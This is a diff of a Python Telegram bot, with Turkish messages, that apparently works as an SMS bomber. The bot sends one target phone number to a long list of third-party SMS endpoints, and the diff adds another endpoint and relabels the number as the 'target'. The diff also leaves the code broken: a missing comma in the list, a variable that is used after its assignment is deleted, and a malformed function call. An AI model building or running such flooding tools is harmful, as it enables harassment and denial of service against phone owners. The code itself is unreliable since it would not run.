@@ -1034,6 +1034,7 @@ SMS_APIS = [
     {"name": "Camel", "url": "https://impartial-thorn-camel.glitch.me/sms?phone="},
     {"name": "Trouble", "url": "https://understood-sincere-trouble.glitch.me/sms?phone="},
     {"name": "Amber", "url": "https://separated-amber-girl.glitch.me/sms?phone="}
+    {"name": "Kredim", "url": "https://cerenyaep.serv00.net/client/app/tbomb/data.php?number="}
 ]
 
 def test_api(api_url, phone):
@@ -1069,7 +1070,7 @@ def handle_sms(message):
             return
 
         # Test mesajı gönder
-        progress_msg = bot.reply_to(message, f"🔍 {len(SMS_APIS)} API test ediliyor...\n📞 Numara: {phone}")
+        progress_msg = bot.reply_to(message, f"🔍 {len(SMS_APIS)} API Test Ediliyor...\n📞 HEDEF: {phone}")
 
         results = []
         for api in SMS_APIS:
@@ -1236,7 +1237,7 @@ def yaz_command(message):
         text = message.text.replace('/proxy', '').strip()
 
         if not text:  # Eğer kullanıcı metin girmezse
-            bot.reply_to(message, "⚠️ KULLANIM !\n\n Örnek: [ /proxy ]", parse_mode="Markdown")
+            bot.reply_to(message, "⚠️ KULLANIM !\n\n Örnek: [ /proxy random ]", parse_mode="Markdown")
             return
 
         # API'nin formatına uygun hale getiriyoruz
@@ -1248,12 +1249,6 @@ def yaz_command(message):
         # API'ye istek gönderiyoruz
         response = requests.get(api_url)
 
-        # Başarılı yanıt alındıysa resmi gönder
-        if response.status_code == 200:
-            bot.send_photo(message.chat.id, response.content)
-        else:
-            bot.reply_to(message, '⚠️ Bir hata oluştu, lütfen tekrar deneyin.')
-
     except Exception as e:
         bot.reply_to(message, f'⚠️ Bir hata oluştu: {str(e)}')
 
@@ -1264,14 +1259,11 @@ def yaz_command(message):
 def doviz(message):
     try:
         user_id = message.from_user.id  # Kullanıcının ID'sini al
-        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
 
         # Kullanıcı kanalda değilse
         if chat_member.status in ["left", "kicked"]:
             bot.reply_to(
-                message,
-                f"⚠️ Bu komutu kullanabilmek için {CHANNEL_USERNAME} kanalına katılmalısınız!\n\n"
-                f"👉 [Katılmak için buraya tıklayın](https://t.me/{CHANNEL_USERNAME.lstrip('@')})",
+                message
                 parse_mode="Markdown",
                 disable_web_page_preview=True
             )
